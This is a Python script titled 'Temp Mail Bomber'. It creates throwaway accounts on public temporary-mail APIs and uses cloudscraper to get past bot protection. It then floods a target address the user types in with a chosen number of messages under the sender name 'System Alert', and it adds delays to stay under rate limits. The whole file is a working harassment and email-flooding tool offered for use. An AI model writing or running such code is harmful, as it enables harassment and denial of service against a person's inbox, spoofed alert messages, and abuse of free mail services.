import cloudscraper
import random
import string
import time
import socket

# Force IPv4 to avoid Connection Refused (Errno 111)
orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

def create_temp_mail():
    print("[*] Generating a new temp mail account...")
    scraper = cloudscraper.create_scraper()
    apis = ["https://api.mail.tm", "https://api.mail.gw"]
    
    for api_base in apis:
        try:
            # 1. Get available domain
            r = scraper.get(f"{api_base}/domains", timeout=10)
            if r.status_code != 200:
                continue
            
            domains = r.json()
            domain = domains['hydra:member'][0]['domain']
            
            # 2. Create account
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@' + domain
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            
            r = scraper.post(f"{api_base}/accounts", json={"address": email, "password": password}, timeout=10)
            if r.status_code not in [200, 201]:
                continue
                
            # 3. Login
            r = scraper.post(f"{api_base}/token", json={"address": email, "password": password}, timeout=10)
            if r.status_code != 200:
                continue
                
            token = r.json()['token']
            print(f"[+] Temp mail created: {email} via {api_base}")
            return (api_base, email, token)
            
        except Exception as e:
            print(f"[-] Failed on {api_base}: {str(e)}")
            continue
            
    return None

def send_mail(target, subject, body, count):
    session = create_temp_mail()
    if not session:
        return "[-] Error: All APIs failed to connect. Check your network/VPN."
        
    api_base, email, token = session
    scraper = cloudscraper.create_scraper()
    
    sent = 0
    print(f"[*] Starting to send {count} emails to {target}...")
    
    for i in range(count):
        payload = {
            "from": {"address": email, "name": "System Alert"},
            "to": [{"address": target}],
            "subject": subject,
            "text": body
        }
        headers = {"Authorization": f"Bearer {token}"}
        
        try:
            r = scraper.post(f"{api_base}/messages", json=payload, headers=headers, timeout=10)
            if r.status_code in [200, 201]:
                sent += 1
                print(f"[+] Sent {sent}/{count}")
            else:
                print(f"[-] Failed to send #{i+1}: {r.text[:50]}")
        except Exception as e:
            print(f"[-] Send error: {str(e)}")
            
        time.sleep(2) # Delay to avoid rate limit
    
    return f"[+] Done. {sent} out of {count} emails sent successfully from {email}"

if __name__ == "__main__":
    print("=== Temp Mail Bomber ===")
    target = input("Target Email: ").strip()
    subject = input("Subject: ").strip()
    body = input("Message: ").strip()
    count = int(input("Count: ").strip())
    
    result = send_mail(target, subject, body, count)
    print(result)
